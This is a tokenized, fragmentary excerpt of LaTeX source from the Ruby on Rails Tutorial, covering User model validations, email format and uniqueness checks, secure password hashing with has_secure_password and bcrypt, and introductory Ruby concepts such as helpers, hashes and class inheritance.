▁Note ▁that ▁if ▁any ▁of ▁the ▁validations ▁fail , ▁such ▁as ▁when ▁a ▁password ▁is ▁required ▁to ▁save ▁a ▁record ▁( as ▁implemented ▁in ▁Section ~\ ref { sec : adding _ a _ secure _ password }), ▁the ▁call ▁to ▁\ k ode { update \_ attributes } ▁will ▁fail .
▁If ▁we ▁need ▁to ▁update ▁only ▁a ▁single ▁attribute , ▁using ▁the ▁singular ▁\ k ode { update \_ attribute } ▁bypass es ▁this ▁restrict ion :
▁To ▁write ▁a ▁test ▁for ▁a ▁valid ▁object , ▁we ' ll ▁create ▁an ▁initially ▁valid ▁User ▁model ▁object ▁\ k ode {@ user } ▁using ▁the ▁special ▁\ k ode { setup } ▁method ▁( discusse d ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : static _ pages } ▁ exercises ), ▁which ▁automatically ▁get s ▁run ▁before ▁each ▁test . ▁Because ▁\ k ode {@ user } ▁is ▁an ▁instance ▁variable , ▁it ' s ▁automatically ▁available ▁in ▁all ▁the ▁tests , ▁and ▁we ▁can ▁test ▁its ▁validity ▁using ▁the ▁\ k ode { valid ?}\ ▁method ▁( Section ~\ ref { sec : creating _ user _ objects }).
▁A ▁test ▁for ▁an ▁initially ▁valid ▁user .
▁We ' ll ▁start ▁with ▁a ▁test ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute ▁by ▁build ing ▁on ▁the ▁test ▁in ▁Listing ~\ ref { code : valid _ user _ test }.
▁As ▁seen ▁in ▁Listing ~\ ref { code : name _ presence _ test }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode {@ user } ▁variable ' s ▁\ k ode { name } ▁attribute ▁to ▁a ▁blank ▁string ▁( in ▁this ▁case , ▁a ▁string ▁of ▁spaces ) ▁and ▁the n ▁check ▁( using ▁the ▁\ k ode { assert \_ not } ▁method ) ▁that ▁the ▁result ing ▁User ▁object ▁is ▁not ▁valid .
▁As ▁we ▁saw ▁brief ly ▁before ▁in ▁the ▁Chapter ~\ ref { cha : a _ toy _ app } ▁ exercises , ▁the ▁way ▁to ▁validate ▁the ▁presence ▁of ▁the ▁name ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { validates } ▁method ▁with ▁argument ▁\ k ode { presence : ▁true }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name }.
▁Validat ing ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute .
▁As ▁a ▁result , ▁the ▁test ▁in ▁Listing ~\ ref { code : name _ presence _ test } ▁should ▁now ▁be ▁\ passing :
▁Validat ing ▁the ▁presence ▁of ▁an ▁\ k ode { email } ▁attribute .
▁At ▁this ▁point , ▁the ▁presence ▁validations ▁are ▁complete , ▁and ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁ Adding ▁a ▁length ▁validation ▁for ▁the ▁\ k ode { name } ▁attribute .
▁To ▁make ▁these ▁collection s , ▁it ' s ▁worth ▁know ing ▁about ▁the ▁useful ▁\ k ode { \ % w [ ]} ▁technique ▁for ▁making ▁arrays ▁of ▁strings , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁Tests ▁for ▁valid ▁email ▁format s .
▁( This ▁uses ▁the ▁interpolate d ▁\ k ode { inspect } ▁method ▁mentioned ▁in ▁Section ~\ ref { sec : hashes _ and _ symbol s }. )
▁ Includ ing ▁the ▁specific ▁address ▁that ▁cause s ▁any ▁failure ▁is ▁es pecially ▁useful ▁in ▁a ▁test ▁with ▁an ▁\ k ode { each } ▁loop ▁like ▁Listing ~\ ref { code : email _ format _ valid _ tests } ; ▁otherwise , ▁any ▁failure ▁would ▁me re ly ▁identify ▁the ▁line ▁number , ▁which ▁is ▁the ▁same ▁for ▁all ▁the ▁email ▁addresses , ▁and ▁which ▁would n ' t ▁be ▁ s u ff ic i ent ▁to ▁identify ▁the ▁source ▁of ▁the ▁problem .
▁at ▁least ▁one ▁word ▁character , ▁plus , ▁h y ph en , ▁or ▁do t
▁B re a k ing ▁down ▁the ▁valid ▁email ▁regex .
▁The ▁a we some ▁\ href { http :// www . rubular . com /}{ Rubular } ▁regular ▁expression ▁editor .
▁Validat ing ▁the ▁email ▁format ▁with ▁a ▁regular ▁expression .
▁Here ▁the ▁regex ▁\ k ode { VALID \_ EMAIL \_ RE G E X } ▁is ▁a ▁\ emph { constant }, ▁indicate d ▁in ▁Ruby ▁by ▁a ▁name ▁starting ▁with ▁a ▁c api t al ▁letter .
▁A ▁test ▁for ▁the ▁reject ion ▁of ▁duplicate ▁email ▁addresses .
▁For t un ate ly , ▁\ k ode { : uniqueness } ▁accept s ▁an ▁option , ▁\ k ode { : case \_ sensitive }, ▁for ▁just ▁this ▁purpose ▁( Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive }).
▁Consider , ▁for ▁example , ▁the ▁\ text tt { email } ▁attribute ▁created ▁by ▁the ▁migration ▁in ▁Listing ~\ ref { code : users _ migration }.
▁When ▁we ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁sample ▁app ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁we ▁will ▁need ▁to ▁find ▁the ▁user ▁record ▁corresponding ▁to ▁the ▁submitted ▁email ▁address .
▁Of ▁course , ▁we ▁could ▁just ▁edit ▁the ▁migration ▁file ▁for ▁the ▁\ k ode { users } ▁table ▁in ▁Listing ~\ ref { code : users _ migration }, ▁but ▁that ▁would ▁require ▁roll ing ▁back ▁and ▁the n ▁migrat ing ▁back ▁up .
▁This ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { add \_ index } ▁to ▁add ▁an ▁index ▁on ▁the ▁\ k ode { email } ▁column ▁of ▁the ▁\ k ode { users } ▁table .
▁The ▁default ▁user ▁fixtures .
▁Because ▁we ▁won ' t ▁need ▁fixtures ▁un til ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁for ▁now ▁we ' ll ▁just ▁remove ▁them , ▁leav ing ▁an ▁empty ▁fixtures ▁file ▁( Listing ~\ ref { code : empty _ fixtures }).
▁An ▁empty ▁fixtures ▁file .
▁In ▁the ▁present ▁case , ▁that ▁point ▁is ▁before ▁the ▁object ▁is ▁saved , ▁so ▁we ' ll ▁use ▁a ▁\ k ode { before \_ save } ▁callback ▁to ▁ downcase ▁the ▁email ▁attribute ▁before ▁saving ▁the ▁user
▁( This ▁is ▁just ▁a ▁first ▁implementation ; ▁we ' ll ▁discuss ▁this ▁subject ▁again ▁in ▁Section ~\ ref { sec : account _ activation s _ resource }, ▁where ▁we ' ll ▁use ▁the ▁preferred ▁\ emph { method ▁reference } ▁convention ▁for ▁defin ing ▁callbacks .)
▁Ensur ing ▁email ▁uniqueness ▁by ▁downcas ing ▁the ▁email ▁attribute .
▁The ▁code ▁in ▁Listing ~\ ref { code : email _ downcase } ▁passes ▁a ▁block ▁to ▁the ▁\ k ode { before \_ save } ▁callback ▁and ▁set s ▁the ▁user ' s ▁email ▁address ▁to ▁a ▁lower - case ▁version ▁of ▁its ▁current ▁value ▁using ▁the ▁\ k ode { downcase } ▁string ▁method .
▁We ▁ en counter ed ▁this ▁idea ▁brief ly ▁in ▁the ▁context ▁of ▁\ k ode { reverse } ▁in ▁the ▁\ k ode { palindrome } ▁method ▁( Section ~\ ref { sec : a _ class _ of _ our _ own }), ▁which ▁also ▁noted ▁that ▁\ k ode { self } ▁is ▁\ emph { not } ▁optional ▁in ▁an ▁assignment , ▁so
▁In ▁the ▁present ▁context , ▁a ▁\ emph { hash } ▁refer s ▁not ▁to ▁the ▁Ruby ▁data ▁structure ▁from ▁Section ~\ ref { sec : hashes _ and _ symbol s } ▁but ▁rather ▁to ▁the ▁result ▁of ▁apply ing ▁an ▁ ir reversible ▁\ href { http :// en . wiki p edia . org / wiki / Hash _ function }{ hash ▁function } ▁to ▁input ▁data .)
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁ Most ▁of ▁the ▁secure ▁password ▁machinery ▁will ▁be ▁implemented ▁using ▁a ▁single ▁Rails ▁method ▁called ▁\ k ode { has \_ secure \_ password }, ▁which ▁we ' ll ▁include ▁in ▁the ▁User ▁model ▁as ▁follows :
▁The ▁ability ▁to ▁save ▁a ▁secure ly ▁hash ed ▁\ k ode { password \_ digest } ▁attribute ▁to ▁the ▁database
▁The ▁only ▁requirement ▁for ▁\ k ode { has \_ secure \_ password } ▁to ▁work ▁its ▁magic ▁is ▁for ▁the ▁corresponding ▁model ▁to ▁have ▁an ▁attribute ▁called ▁\ k ode { password \_ digest }. ▁(
▁For ▁example , ▁the ▁\ href { https :// github . com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password . rb }{ source ▁code } ▁of ▁\ k ode { has \_ secure \_ password } ▁make s ▁this ▁mistake , ▁as ▁did ▁the ▁first ▁two ▁edition s ▁of ▁this ▁tutorial .
▁The ▁User ▁data ▁model ▁with ▁an ▁added ▁\ k ode { password \_ digest } ▁attribute .
▁To ▁implement ▁the ▁data ▁model ▁in ▁F igure ~\ ref { fig : user _ model _ password _ digest } ▁ , ▁we ▁first ▁generate ▁an ▁appropriate ▁migration ▁for ▁the ▁\ k ode { password \_ digest } ▁column .
▁The ▁result , ▁with ▁migration ▁name ▁\ k ode { add \_ password \_ digest \_ to \_ users }, ▁appears ▁as ▁follows :
▁Here ▁we ' ve ▁also ▁supplied ▁the ▁argument ▁\ k ode { password \_ digest : string } ▁with ▁the ▁name ▁and ▁type ▁of ▁attribute ▁we ▁want ▁to ▁create .
▁as ▁seen ▁in ▁Listing ~\ ref { code : password _ migration }.
▁The ▁migration ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁Listing ~\ ref { code : password _ migration } ▁uses ▁the ▁\ k ode { add \_ column } ▁method ▁to ▁add ▁a ▁\ k ode { password \_ digest } ▁column ▁to ▁the ▁\ k ode { users } ▁table .
▁To ▁make ▁the ▁password ▁digest , ▁\ k ode { has \_ secure \_ password } ▁uses ▁a ▁state - of - the - ar t ▁hash ▁function ▁called ▁\ href { http :// en . wiki p edia . org / wiki / B crypt }{ bcrypt }.
▁Now ▁that ▁we ' ve ▁supplied ▁the ▁User ▁model ▁with ▁the ▁required ▁\ k ode { password \_ digest } ▁attribute ▁and ▁installed ▁bcrypt , ▁we ' re ▁ready ▁to ▁add ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model , ▁as ▁show n ▁in ▁Listing ~\ ref { code : has _ secure _ password }.
▁ Adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model .
▁The ▁reason ▁is ▁that , ▁as ▁noted ▁in ▁Section ~\ ref { sec : a _ hash ed _ password }, ▁\ k ode { has \_ secure \_ password } ▁enforce s ▁validations ▁on ▁the ▁virtual ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes , ▁but ▁the ▁tests ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } ▁create ▁an ▁\ k ode {@ user } ▁variable ▁without ▁these ▁attributes :
▁We ' ll ▁see ▁in ▁just ▁a ▁moment ▁the ▁benefit s ▁of ▁adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▁( Section ~\ ref { sec : creating _ and _ authenticating _ a _ user }), ▁but ▁first ▁we ' ll ▁add ▁a ▁minimal ▁requirement ▁on ▁password ▁security .
▁You ▁may ▁be ▁able ▁to ▁guess ▁the ▁code ▁for ▁enforc ing ▁a ▁\ k ode { minimum } ▁length ▁constraint ▁by ▁refer r ing ▁to ▁the ▁corresponding ▁\ k ode { maximum } ▁validation ▁for ▁the ▁user ' s ▁name ▁( Listing ~\ ref { code : length _ validation }) :
▁in ▁Listing ~\ ref { code : password _ implementation }.
▁S ince ▁users ▁can ' t ▁yet ▁sign ▁up ▁for ▁the ▁sample ▁application ▁through ▁the ▁web --- that ' s ▁the ▁goal ▁of ▁Chapter ~\ ref { cha : sign _ up }--- we ' ll ▁use ▁the ▁Rails ▁console ▁to ▁create ▁a ▁new ▁user ▁by ▁hand .
▁For ▁convenience , ▁we ' ll ▁use ▁the ▁\ k ode { create } ▁method ▁discuss ed ▁in ▁Section ~\ ref { sec : creating _ user _ objects }, ▁but ▁in ▁the ▁present ▁case ▁we ' ll ▁take ▁care ▁\ emph { not } ▁to ▁start ▁in ▁a ▁ sandbox ▁so ▁that ▁the ▁result ing ▁user ▁will ▁be ▁saved ▁to ▁the ▁database .
▁( We ' ll ▁learn ▁a ▁more ▁elegant ▁method ▁for ▁doing ▁this ▁in ▁Chapter ~\ ref { cha : sign _ up }. )
▁A ▁user ▁row ▁in ▁the ▁SQLite ▁database ▁\ k ode { db / development . sqlite 3 }.
▁Return ing ▁to ▁the ▁console , ▁we ▁can ▁see ▁the ▁effect ▁of ▁\ k ode { has \_ secure \_ password } ▁from ▁Listing ~\ ref { code : password _ implementation } ▁by ▁look ing ▁at ▁the ▁\ k ode { password \_ digest } ▁attribute :
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ hash ed _ password }, ▁\ k ode { has \_ secure \_ password } ▁automatically ▁add s ▁an ▁\ k ode { authenticate } ▁method ▁to ▁the ▁corresponding ▁model ▁objects .
▁This ▁method ▁determine s ▁if ▁a ▁given ▁password ▁is ▁valid ▁for ▁a ▁particular ▁user ▁by ▁com put ing ▁its ▁digest ▁and ▁compar ing ▁the ▁result ▁to ▁\ k ode { password \_ digest } ▁in ▁the ▁database .
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
▁In ▁the ▁next ▁chapter , ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁make ▁a ▁working ▁signup ▁form ▁to ▁create ▁new ▁users , ▁together ▁with ▁a ▁page ▁to ▁display ▁each ▁user ' s ▁information .
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁the n ▁use ▁the ▁authentication ▁machinery ▁from ▁Section ~\ ref { sec : adding _ a _ secure _ password } ▁to ▁let ▁users ▁log ▁into ▁the ▁site .
▁This ▁test ▁uses ▁the ▁\ k ode { reload } ▁method ▁for ▁reload ing ▁a ▁value ▁from ▁the ▁database ▁and ▁the ▁\ k ode { assert \_ equal } ▁method ▁for ▁testing ▁equal ity .
▁By ▁running ▁the ▁test ▁suite , ▁verify ▁that ▁the ▁\ k ode { before \_ save } ▁callback ▁can ▁be ▁written ▁using ▁the ▁`` bang '' ▁method ▁\ k ode { email . downcase ! } \ ▁to ▁modify ▁the ▁\ k ode { email } ▁attribute ▁directly , ▁as ▁show n ▁in ▁Listing ~\ ref { code : downcase _ bang }.
▁An ▁alternate ▁implementation ▁of ▁the ▁\ k ode { before \_ save } ▁callback .
▁G rounded ▁in ▁examples ▁from ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁chapter ▁explor es ▁some ▁elements ▁of ▁the ▁Ruby ▁programming ▁language ▁that ▁are ▁important ▁for ▁Rails .
▁When ▁we ▁last ▁saw ▁our ▁new ▁application , ▁we ▁ha d ▁just ▁updated ▁our ▁most ly ▁static ▁pages ▁to ▁use ▁Rails ▁layout s ▁to ▁eliminate ▁duplication ▁in ▁our ▁views , ▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ layout _ redux } ▁( which ▁is ▁the ▁same ▁as ▁Listing ~\ ref { code : application _ layout }).
▁The ▁sample ▁application ▁site ▁layout .
▁Let ' s ▁focus ▁on ▁one ▁particular ▁line ▁in ▁Listing ~\ ref { code : application _ layout _ redux } :
▁This ▁uses ▁the ▁built - in ▁Rails ▁function ▁\ k ode { stylesheet \_ link \_ tag } ▁( which ▁you ▁can ▁read ▁more ▁about ▁at ▁the ▁\ href { http :// api . rubyonrails . org / classes / ActionView / Helpers / Asset T a g Helper . html # method - i - stylesheet _ link _ tag }{ Rails ▁API }) ▁to ▁include ▁\ k ode { application . css } ▁for ▁all ▁\ href { http :// www . w 3 . org / T R / CSS 2 / m edia . html }{ m edia ▁types } ▁( including ▁computer ▁screen s ▁and ▁ print ers ).
▁Such ▁functions ▁are ▁called ▁\ emph { helpers } ; ▁to ▁see ▁how ▁to ▁make ▁a ▁custom ▁helper , ▁let ' s ▁start ▁by ▁examining ▁the ▁title ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } :
▁< n > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App
▁To ▁solve ▁the ▁problem ▁of ▁a ▁missing ▁page ▁title , ▁we ' ll ▁define ▁a ▁custom ▁helper ▁called ▁\ k ode { full \_ title }.
▁The ▁\ k ode { full \_ title } ▁helper ▁returns ▁a ▁base ▁title , ▁`` Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App '' , ▁if ▁no ▁page ▁title ▁is ▁defined , ▁and ▁add s ▁a ▁vertical ▁bar ▁pre c ed ed ▁by ▁the ▁page ▁title ▁if ▁one ▁is ▁defined ▁( Listing ~\ ref { code : title _ helper })
▁If ▁a ▁helper ▁is ▁specific ▁to ▁a ▁particular ▁controller , ▁you ▁should ▁put ▁it ▁in ▁the ▁corresponding ▁helper ▁file ; ▁for ▁example , ▁helpers ▁for ▁the ▁Static ▁Pages ▁controller ▁generally ▁go ▁in ▁\ k ode { app / helpers / static \_ pages \_ helper . rb }.
▁In ▁our ▁case , ▁we ▁expect ▁the ▁\ k ode { full \_ title } ▁helper ▁to ▁be ▁used ▁on ▁all ▁the ▁site ' s ▁pages , ▁and ▁Rails ▁has ▁a ▁special ▁helper ▁file ▁for ▁this ▁case : ▁\ k ode { app / helpers / application \_ helper . rb }.
▁Defin ing ▁a ▁\ k ode { full \_ title } ▁helper .
▁as ▁seen ▁in ▁Listing ~\ ref { code : application _ layout _ full _ title }.
▁The ▁site ▁layout ▁with ▁the ▁\ k ode { full \_ title } ▁helper .
▁We ▁do ▁this ▁by ▁first ▁updating ▁our ▁test ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ base _ title _ spec }, ▁which ▁update s ▁the ▁previous ▁title ▁test ▁and ▁add s ▁one ▁to ▁test ▁for ▁the ▁absence ▁of ▁the ▁custom ▁\ k ode {" Home "} ▁string ▁in ▁the ▁title .
▁To ▁get ▁the ▁test ▁suite ▁to ▁pass , ▁we ' ll ▁remove ▁the ▁\ k ode { provide } ▁line ▁from ▁the ▁Home ▁page ' s ▁view , ▁as ▁seen ▁in ▁Listing ~\ ref { code : home _ page _ base _ title }.
▁As ▁with ▁the ▁line ▁to ▁include ▁the ▁application ▁stylesheet , ▁the ▁code ▁in ▁Listing ~\ ref { code : title _ helper } ▁may ▁look ▁simple ▁to ▁the ▁e y es ▁of ▁an ▁experience d ▁Rails ▁developer , ▁but ▁it ' s ▁\ emph { full } ▁of ▁important ▁Ruby ▁idea s : ▁module s , ▁method ▁definition , ▁optional ▁method ▁arguments , ▁comments , ▁local ▁variable ▁assignment , ▁boolean s , ▁control ▁ flow , ▁string ▁ concat en ation , ▁and ▁return ▁values .
▁One ▁example ▁is ▁the ▁\ k ode { to \_ s } ▁method ▁that ▁can ▁convert ▁virtual ly ▁any ▁object ▁to ▁a ▁string :
▁We ▁see ▁here ▁that ▁the ▁\ k ode { nil } ▁object ▁does n ' t ▁itself ▁respond ▁to ▁the ▁\ k ode { empty ?}\ ▁method , ▁but ▁\ k ode { nil . to \_ s } ▁does .
▁The ▁console ▁allows ▁us ▁to ▁define ▁methods ▁the ▁same ▁way ▁we ▁did ▁with ▁the ▁\ k ode { home } ▁action ▁from ▁Listing ~\ ref { code : static _ pages _ controller } ▁or ▁the ▁\ k ode { full \_ title } ▁helper ▁from ▁Listing ~\ ref { code : title _ helper }.
▁For ▁example , ▁let ' s ▁define ▁a ▁function ▁\ k ode { string \_ message } ▁that ▁take s ▁a ▁single ▁\ emph { argument } ▁and ▁returns ▁a ▁message ▁base d ▁on ▁whether ▁the ▁argument ▁is ▁empty ▁or ▁not :
▁In ▁other ▁words , ▁the ▁first ▁example ▁above ▁could ▁replace ▁\ k ode { str } ▁with ▁any ▁other ▁valid ▁variable ▁name , ▁such ▁as ▁\ k ode { the \_ function \_ argument }, ▁and ▁it ▁would ▁work ▁just ▁the ▁same :
▁We ll , ▁there ▁will ▁ still ▁be ▁\ emph { one } ▁thing ▁left ▁that ▁we ▁don ' t ▁understand , ▁which ▁is ▁how ▁Rails ▁t ies ▁this ▁all ▁together : ▁mapping ▁URLs ▁to ▁actions , ▁making ▁the ▁\ k ode { full \_ title } ▁helper ▁available ▁in ▁views , ▁etc . ▁This ▁is ▁an ▁interest ing ▁subject , ▁and ▁I ▁encourag e ▁you ▁to ▁in ve st ig ate ▁it ▁further , ▁but ▁know ing ▁exactly ▁\ emph { how } ▁Rails ▁works ▁is ▁not ▁necessary ▁when ▁\ emph { using } ▁Rails .
▁An ▁ annotate d ▁\ k ode { title \_ helper }.
▁The ▁result ▁is ▁that ▁the ▁\ k ode { full \_ title } ▁method ▁is ▁\ href { http :// cat b . org / j argon / html / A / automagically . html }{ automagically } ▁available ▁in ▁all ▁our ▁views .
▁We ▁have n ' t ▁discuss ed ▁arrays ▁yet ▁in ▁the ▁\ emph { Rails ▁Tutorial }, ▁but ▁understanding ▁them ▁gives ▁a ▁good ▁foundation ▁for ▁understanding ▁hashes ▁( Section ~\ ref { sec : hashes _ and _ symbol s }) ▁and ▁for ▁aspect s ▁of ▁Rails ▁data ▁model ing ▁( such ▁as ▁the ▁\ k ode { has \_ many } ▁association ▁seen ▁in ▁Section ~\ ref { sec : demo _ user _ has _ many _ microposts } ▁and ▁covered ▁more ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }).
▁C lo se ly ▁related ▁to ▁arrays ▁are ▁\ emph { range s }, ▁which ▁can ▁ probably ▁most ▁easily ▁be ▁under st ood ▁by ▁convert ing ▁them ▁to ▁arrays ▁using ▁the ▁\ k ode { to \_ a } ▁method :
▁ Hash ▁values ▁can ▁be ▁virtual ly ▁anything , ▁even ▁other ▁hashes , ▁as ▁seen ▁in ▁Listing ~\ ref { code : nested _ hashes }.
▁It ' s ▁time ▁now ▁to ▁re visit ▁the ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } ▁used ▁in ▁the ▁layout ▁to ▁include ▁the ▁cascad ing ▁style ▁ sheet s :
▁For ▁example , ▁if ▁you ▁take ▁a ▁look ▁back ▁at ▁F igure ~\ ref { fig : cloud 9 _ gemfile }, ▁you ' ll ▁see ▁a ▁small ▁vertical ▁line ▁on ▁the ▁right ▁to ▁help ▁keep ▁code ▁under ▁80 ▁characters .
▁calls ▁the ▁\ k ode { stylesheet \_ link \_ tag } ▁function ▁with ▁two ▁arguments : ▁a ▁string , ▁indicat ing ▁the ▁path ▁to ▁the ▁stylesheet , ▁and ▁a ▁hash ▁with ▁two ▁elements , ▁indicat ing ▁the ▁m edia ▁type ▁and ▁tell ing ▁Rails ▁to ▁use ▁the ▁\ href { https :// github . com / rails / turbolinks }{ turbolinks } ▁feature ▁added ▁in ▁Rails ~4.0 .
▁A ▁diagram ▁of ▁this ▁inheritance ▁hierarchy ▁appears ▁in ▁F igure ~\ ref { fig : string _ inheritance _ ruby _ 1 _ 9 }.
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁\ k ode { String } ▁class .
▁S ince ▁a ▁word ▁\ emph { is ▁a } ▁string , ▁it ' s ▁more ▁natural ▁to ▁have ▁our ▁\ k ode { Word } ▁class ▁\ emph { inherit } ▁from ▁\ k ode { String }, ▁as ▁seen ▁in ▁Listing ~\ ref { code : word _ class }.
▁Here ▁\ k ode { Word ▁< ▁ String } ▁is ▁the ▁Ruby ▁syntax ▁for ▁inheritance ▁( discusse d ▁brief ly ▁in ▁Section ~\ ref { sec : static _ pages }), ▁which ▁ensure s ▁that , ▁in ▁addition ▁to ▁the ▁new ▁\ k ode { palindrome ?}\ ▁method , ▁words ▁also ▁have ▁all ▁the ▁same ▁methods ▁as ▁strings :
▁This ▁hierarchy ▁is ▁illustrate d ▁in ▁F igure ~\ ref { fig : word _ inheritance _ ruby _ 1 _ 9 }.
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁( n on - built - in ) ▁\ k ode { Word } ▁class ▁from ▁Listing ~\ ref { code : word _ class }.
▁In ▁Listing ~\ ref { code : word _ class }, ▁note ▁that ▁check ing ▁that ▁the ▁word ▁is ▁its ▁own ▁reverse ▁involve s ▁access ing ▁the ▁word ▁inside ▁the ▁\ k ode { Word } ▁class .
▁All ▁this ▁t al k ▁about ▁classes ▁and ▁inheritance ▁may ▁have ▁trigger ed ▁a ▁flash ▁of ▁re co g n it ion , ▁because ▁we ▁have ▁seen ▁both ▁before , ▁in ▁the ▁Static ▁Pages ▁controller ▁( Listing ~\ ref { code : adding _ the _ about _ page }) :
▁A ▁diagram ▁of ▁this ▁hierarchy ▁appears ▁in ▁F igure ~\ ref { fig : static _ pages _ controller _ inheritance }.
▁The ▁point ▁of ▁the ▁\ k ode { home } ▁action , ▁as ▁we ▁saw ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁is ▁to ▁render ▁a ▁web ▁page , ▁not ▁to ▁return ▁a ▁value .
▁We ▁end ▁our ▁to ur ▁of ▁Ruby ▁with ▁a ▁complete ▁class ▁of ▁our ▁own , ▁a ▁\ k ode { User } ▁class ▁that ▁an tic ip ate s ▁the ▁User ▁model ▁com ing ▁up ▁in ▁Chapter ~\ ref { cha : modeling _ users }.
▁So ▁far ▁we ' ve ▁entered ▁class ▁definition s ▁at ▁the ▁console , ▁but ▁this ▁quickly ▁becomes ▁ti re some ; ▁instead , ▁create ▁the ▁file ▁\ k ode { example \_ user . rb } ▁in ▁your ▁application ▁root ▁directory ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : example _ user }.
▁Code ▁for ▁an ▁example ▁user .
▁This ▁creates ▁`` get ter '' ▁and ▁`` set ter '' ▁methods ▁that ▁allow ▁us ▁to ▁retrieve ▁( get ) ▁and ▁assign ▁( set ) ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁\ emph { instance ▁variables }, ▁which ▁were ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▁and ▁Section ~\ ref { sec : static _ pages _ exercises }.
▁F inally , ▁our ▁class ▁defines ▁a ▁method ▁called ▁\ k ode { formatted \_ email } ▁that ▁uses ▁the ▁values ▁of ▁the ▁assign ed ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁variables ▁to ▁build ▁up ▁a ▁nicely ▁ formatted ▁version ▁of ▁the ▁user ' s ▁email ▁address ▁using ▁string ▁interpolation ▁( Section ~\ ref { sec : string s }) :
▁Because ▁\ k ode {@ name } ▁and ▁\ k ode {@ email } ▁are ▁both ▁instance ▁variables ▁( as ▁indicate d ▁with ▁the ~\ k ode {@ } ▁sign ), ▁they ▁are ▁automatically ▁available ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁Let ' s ▁fire ▁up ▁the ▁console , ▁\ k ode { require } ▁the ▁example ▁user ▁code , ▁and ▁take ▁our ▁User ▁class ▁out ▁for ▁a ▁sp in :
▁Here ▁the ▁\ k ode { ' . ' } ▁is ▁Unix ▁for ▁`` current ▁directory '' , ▁and ▁\ k ode { ' . / example \_ user ' } ▁tell s ▁Ruby ▁to ▁look ▁for ▁an ▁example ▁user ▁file ▁relative ▁to ▁that ▁location .
▁The ▁subsequent ▁code ▁creates ▁an ▁empty ▁example ▁user ▁and ▁the n ▁fill s ▁in ▁the ▁name ▁and ▁email ▁address ▁by ▁assign ing ▁directly ▁to ▁the ▁corresponding ▁attributes ▁( assignment s ▁made ▁possible ▁by ▁the ▁\ k ode { attr \_ accessor } ▁line ▁in ▁Listing ~\ ref { code : example _ user }).
▁Ruby ▁is ▁setting ▁the ▁\ k ode {@ name } ▁variable ▁to ▁\ k ode {" Ex ample ▁User "} ▁( and ▁similar ly ▁for ▁the ▁\ k ode { email } ▁attribute ), ▁which ▁we ▁the n ▁use ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁We ▁will ▁see ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up } ▁that ▁initializ ing ▁objects ▁using ▁a ▁hash ▁argument , ▁a ▁technique ▁known ▁as ▁\ emph { mass ▁assignment }, ▁is ▁common ▁in ▁Rails ▁applications .
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ' ll ▁start ▁ putting ▁it ▁to ▁good ▁use ▁in ▁developing ▁the ▁sample ▁application .
▁We ▁won ' t ▁be ▁using ▁the ▁\ k ode { example \_ user . rb } ▁file ▁from ▁Section ~\ ref { sec : a _ user _ class }, ▁so ▁I ▁suggest ▁remov ing ▁it :
▁By ▁replacing ▁the ▁question ▁mark s ▁in ▁Listing ~\ ref { code : string _ shuffle } ▁with ▁the ▁appropriate ▁methods , ▁combine ▁\ k ode { split }, ▁\ k ode { shuffle }, ▁and ▁\ k ode { join } ▁to ▁write ▁a ▁function ▁that ▁ shuffle s ▁the ▁letter s ▁in ▁a ▁given ▁string .
